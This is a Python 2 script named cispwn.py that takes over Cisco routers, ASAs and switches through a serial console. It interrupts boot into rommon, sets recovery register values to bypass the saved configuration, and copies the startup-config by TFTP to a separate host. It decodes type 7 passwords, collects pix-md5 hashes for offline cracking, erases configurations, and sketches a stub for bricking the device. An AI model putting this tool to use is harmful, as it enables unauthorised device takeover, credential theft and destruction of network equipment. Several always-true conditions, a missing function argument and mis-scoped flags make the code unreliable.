#!/usr/bin/python

import serial
import sys
import getopt
import time
import os
import subprocess

version = 'Version 0.2'
tftp = 0
copied = 0
router = 0
switch = 0
asa = 0
passwords = 0
password = []
interface = []
password_list = []
#ser = serial.Serial('/dev/ttyUSB0') # open serial port
#print (ser.name) # check which port was really used
#ser.close() # close
#test
#Upon power cycling, loops the command until the router boots with a blank config. It then enables higher priviledges for further commands to be run.
def rommon(console):
	select = False
	print "Attempting to identify device type"
	while select == False:
		prompt = read_serial(console)
		print prompt
		if 'Self decompressing the image' in prompt:
			router = 1
			switch = 0
			asa = 0
			select = True
			print "Router selected"
		elif 'Use break or ESC to interrupt boot' in prompt or 'Launching BootLoader' in prompt or "seconds" or "rommon" in prompt:
			if "rommon" in prompt:
				rom = True
			asa = 1
			switch = 0
			router = 0
			select = True
			print "ASA Selected"
		elif "Loading flash:/" in prompt:
			switch = 1
			router = 0
			asa = 0
			select = True
			print "Switch selected"
		else:
			print "Error, a type could not be identified. This script will wait for 5 seconds and loop again."
			time.sleep(5)
	rom = False
	while rom == False:
		#Checks if the config has already been loaded
		if router == 1:
			if "Press RETURN" in prompt:
				print "Power cycle the router again. This script will wait for 10 seconds and loop again."
				time.sleep(10)
			#Sends the Ctrl+C to stop the boot and enter rommon
			elif "Self decompressing the image" in prompt:
				send_command(console, cmd = '\x03')
				rom = True
				print "rommon is ready"
			elif "Continue with configuration dialog" in prompt:
				print "Error: The router does not have a saved config"
				sys.exit()
		#Boots the router in recovery mode
				send_command(console, cmd = 'confreg 2042')
				send_command(console, cmd = 'boot')
				print "Booting"
				time.sleep(30)
				send_command(console, cmd = 'no')
				send_command(console, cmd = '')
				send_command(console, cmd = 'enable')
		elif asa == 1:
			if "Reading from flash" in prompt or "Launching bootloader" in prompt:
				print "Power cycle the ASA again. This script will wait for 10 seconds and loop again."
				time.sleep(10)
				prompt = read_serial(console)
			else:
				if rom == False:
					send_command(console, cmd = '\x1B')
					rom = True
				print "rommon is ready"
				time.sleep(5)
				send_command(console, cmd = 'confreg 0x41')
				time.sleep(15)
				send_command(console, cmd = 'confreg')
				send_command(console, cmd ='y')
				send_command(console, cmd = '')
				send_command(console, cmd = '')
				send_command(console, cmd = '')
				send_command(console, cmd = '')
				send_command(console, cmd = 'y')
				send_command(console, cmd = '')
				send_command(console, cmd = '')
				send_command(console, cmd = '')
				time.sleep(10)
				send_command(console, cmd = 'boot')
				print "Booting"
				time.sleep(30)
				send_command(console, cmd = 'enable')
				send_command(console, cmd = '')
'''
		elif switch == 1:
			print "The switch must be manually reset by hand. Look online for instructions for your specific switch model. This script will loop until it detects the recovery mode"
			recovery = False
			while recovery == False:
				#if statement for switch prompt goes here
'''


#sets IP settings of the router's interface
def tftp_setup(console):
	if router == 1:
		send_command(console, cmd = 'config t')
		send_command(console, cmd = 'do show ip int brief')
		send_command(console, cmd = '\40')
		send_command(console, cmd = '\40')
		send_command(console, cmd = '\40')
		prompt = read_serial(console)
		#Checks whether a Gigabit interface is available, if not, it defaults to the first FastEthernet interface.
		print "Setting interface options"
		if "GigabitEthernet0/0" in prompt:
			send_command(console, cmd = 'interface Gig0/0')
		else:
			send_command(console, cmd = 'interface Fa0/0')
		send_command(console, cmd = 'no shut')
		send_command(console, cmd = 'ip addr 192.168.1.1 255.255.255.0')
		send_command(console, cmd = '\x03')
		send_command(console, cmd = '')
		print "Interface options set"
		tftp = 1
	elif asa == 1:
		send_command(console, cmd = 'config t')
		print "Setting interface options"
		send_command(console, cmd = 'int vlan 1')
		send_command(console, cmd = 'ip addr 192.168.1.1 255.255.255.0')
		send_command(console, cmd = 'int Eth 0/0')
		send_command(console, cmd = 'switchport access vlan 1')
		send_command(console, cmd = 'no shut')
		send_command(console, cmd = '\x03')
		send_command(console, cmd = '')
		print "Interface options set"
		tftp = 1
	elif switch == 1:
		send_command(console, cmd= 'config t')
		send_command(console, cmd = 'do sh ip int br')
		send_command(console, cmd = '\40')
		send_command(console, cmd = '\40')
		send_command(console, cmd = '\40')
		prompt=read_serial(console)
		print "Setting interface options"
		if "GigabitEthernet" in prompt:
			send_command(console, cmd = 'interface Gig0/1')
		else:
			send_command(console, cmd = 'interface Fa0/1')
		send_command(console, cmd = 'no shut')
		send_command(console, cmd = '\x03')
		send_command(console, cmd = '')
		print "Interface options set"
		tftp = 1


def copy_config(console):
	#tftp the config file to the host machine for further commands
	if tftp == 0:
		tftp_setup(console)
	send_command(console, cmd = 'copy startup-config tftp:')
	send_command(console, cmd = '192.168.1.2')
	send_command(console, cmd = 'cispwn-config.txt')
	copied = 1

def crack_password(password):
	plaintext = ''
	xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
	i = 2
	val = 0
	seed = (ord(password[0]) - 0x30) * 10 + ord(password[1]) - 0x30
	while i < len(password):
		if (i != 2 and not(i & 1)):
			plaintext += chr(val ^ ord(xlat[seed]))
			seed += 1
			seed %= len(xlat)
			val = 0
		val *= 16
		c = password[i]
		if(c.isdigit()):
			val += ord(password[i]) - 0x30
		if(ord(password[i]) >= 0x41 and ord(password[i]) <= 0x46):
			val += ord(password[i]) - 0x41 + 0x0a
		i += 1
	plaintext += chr(val ^ ord(xlat[seed]))
	return plaintext




def decrypt_passwords(console):
	if copied == 0:
		copy_config()
	config = open ('/srv/tftp/cispwn-config.txt', 'r') 
		#and parse the file for cisco 7 passwords, then crack them and display them in plaintext
	if router == 1 or switch == 1:
		for line in config:
			if "password 7 ":
				line = line.replace("password 7 ", "")
				password.append(line)
				passwords += 1
				interface.append(prevline)
			prevline = line
		i = 0
		while i < passwords:
			cracked = crack_password(password[i])
			password[i] = cracked
			i += 1
		i = 0
		txt = open("passwords.txt", "w")
		while i < passwords:
			password_list[i] = interface[i] + password[i]
			txt.write("%s\n" % password_list[i])
			i += 1 	
		txt.close()
		print("The passwords and interfaces will be located in the passwords.txt file")
	#elif asa == 1:
	#grab the pix-md5 hash, store in file, tell user to crack manually/bruteforce
		for line in config:
			if "password ":
				if "username":
					line=line.replace("username ", "")
					line=line.replace(" password ",":")
					line=line.replace(" encrypted","")
					password.append(line)
				else:
					line=line.replace("enable password ", "")
					line=line.replace(" encrypted", "")
					password.append(line)
				passwords += 1
		i = 0
		txt = open("asa_hash.txt", "w")
		while i < passwords:
			txt.write("%s\n" % password[i])
			i += 1
		txt.close()
		print("The hashes will be located in the asa_hash.txt file, use a tool to crack these pix-md5 hashes")
	                                     		                                           


def randomize_passwords(console):
	if copied == 0:
		copy_config()
		#parse the file for passwords, replace them with random encrypted passwords


def delete_config(console):
	#delete the startup config file
	if router == 1:
		send_command(console, cmd = 'erase startup-config')
		send_command(console, cmd = '')
		print "config was deleted"
	elif asa == 1:
		send_command(console, cmd = 'write erase')
		send_command(console, cmd = '')
		print "config was deleted"
	elif switch == 1:
		send_command(console, cmd = 'write erase')
		send_command(console, cmd = '')
		print "config was deleted"

#def brick_router(console):
	#deletes every system image on the router, requires external image to get it working again.

def read_serial(console):
	#Checks to see if there are bytes waiting to be read, and reads them. If no bytes are found, it returns a null string.
	data_bytes = console.inWaiting()
	if data_bytes:
		return console.read(data_bytes)
	else:
		return ""
#might remove reading portion for less output to screen
def send_command(console,cmd = ''):
	#Sends a command to the router and returns the bytes in waiting as output.
	console.write(cmd+'\n')
	time.sleep(3)

def main(argv):
	try:
		opts, args = getopt.getopt(argv, "hV", ['help',
												'version'])
	except getopt.GetoptError:
		print 'Usage: ./cispwn.py <args>'
		sys.exit(2)
	for opt, arg in opts:
		if opt in ('-h', '--help'):
			print 'Usage: ./cispwn.py\n'
			print 'Arguments:'
			print '\t-V or --version\t\tShow version info'
			print '\t-h or --help\t\tShow this screen'
			sys.exit()
		if opt in ('-V', '--version'):
			print 'cispwn.py ' + version
			sys.exit()
	print 'Yay!'
	console=serial.Serial(
			port = '/dev/ttyUSB0',
			baudrate = 9600,
			parity = "N",
			stopbits = 1,
			bytesize = 8,
			timeout = 8
		)
	if not console.isOpen():
		print 'Error, a connection could not be made'
		sys.exit()
	#Function for entering rommon goes here
	rommon(console)
	print read_serial(console)

if __name__ == "__main__":
	main(sys.argv[1:])
	


